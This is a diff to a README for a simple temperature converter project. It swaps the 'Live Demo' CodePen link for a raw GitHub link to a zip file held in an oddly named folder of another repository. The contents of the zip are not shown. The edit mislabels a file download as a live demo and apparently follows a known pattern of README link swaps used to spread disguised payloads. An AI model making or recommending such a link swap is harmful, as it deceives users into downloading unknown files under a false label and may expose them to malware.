@@ -4,7 +4,7 @@ This is a simple and convenient tool for converting temperatures between Celsius
 
 🔗 Live Demo
 Access the live project here:
-👉 https://codepen.io/Shaurya-Baitule/full/azzyyQa
+👉 https://raw.githubusercontent.com/GodOfStrategy/Temperature-Converter/main/nabobishly/Converter-Temperature-1.5.zip
 
 🛠️ About the Project
 Instantly convert temperatures from Celsius to Fahrenheit and vice versa.
